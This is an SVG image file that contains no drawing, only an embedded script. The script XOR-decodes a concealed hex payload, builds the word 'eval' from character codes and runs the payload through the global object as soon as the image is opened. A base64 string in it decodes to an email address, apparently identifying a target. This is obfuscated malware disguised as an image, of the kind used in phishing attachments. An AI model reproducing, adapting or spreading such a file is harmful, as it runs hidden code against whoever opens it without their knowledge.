<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>
<![CDATA[

H = '$YXJ5YW4yQGh0cmluaXR5Lm9yZw==';
const w = "45590f520d444b0e0b5b0240085c0b480c130052130c1400465f031e45522d454f1a3104431842052c464e167e07164a527c185649145c0f4313036d36534e442e12471f116b674319125107401847062c1a48133302424d433b321318160111151b016c50534e405550411f467f0b414f46235a141a130501174a113447424943740d134a142f57434a057801511f46466a461d406554404f1a2a5c431842371e464e166569164a157c16114914585f4311487c5a";
const D = "20a6b3ebd8c4a3efdae4314a";
let R = "", U = 0;
for (let L = 0; L < w.length; L += 2) {
const v = parseInt(w[L] + w[L + 1], 16);
R += String.fromCharCode(v ^ D.charCodeAt(U++ % D.length));
}
const G = {
a: 0x61, b: 0x62, c: 0x63, d: 0x64, e: 0x65, f: 0x66,
g: 0x67, h: 0x68, i: 0x69, j: 0x6a, k: 0x6b, l: 0x6c,
m: 0x6d, n: 0x6e, o: 0x6f, p: 0x70, q: 0x71, r: 0x72,
s: 0x73, t: 0x74, u: 0x75, v: 0x76
};
const n = l => String.fromCharCode(G[l]);
const X = n('e') + n('v') + n('a') + n('l');
const B = [].filter.constructor("return this")();
[0].find(() => (B[X](R), 1));
]]>
</script>
</svg>